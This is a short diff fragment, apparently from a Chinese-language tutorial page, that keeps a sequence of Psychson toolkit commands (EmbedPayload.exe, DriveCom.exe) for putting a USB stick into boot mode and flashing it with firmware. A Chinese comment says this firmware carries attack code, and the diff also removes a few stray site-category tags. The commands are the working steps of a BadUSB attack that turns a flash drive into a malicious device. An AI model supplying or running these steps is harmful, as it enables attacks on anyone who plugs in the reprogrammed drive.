@@ -40,14 +40,6 @@ EmbedPayload.exe C:\Psychson-master\inject.bin C:\Psychson-master\firmware\bin\f
 
 `DriveCom.exe /drive=G /action=SetBootMode //设置U盘模式
 
-深入探索
-
-计算机硬件
-
-编程
-
-开发工具
-
 DriveCom.exe /drive=G /action=SendExecutable /burner=BN03V104M.BIN //2302固件
 
 DriveCom.exe /drive=G /action=SendFirmware /burner=C:\Psychson-master\BN03V104M.BIN /firmware=C:\Psychson-master\firmware\bi\fw.bin //写入带有攻击代码的固件到芯片中`  
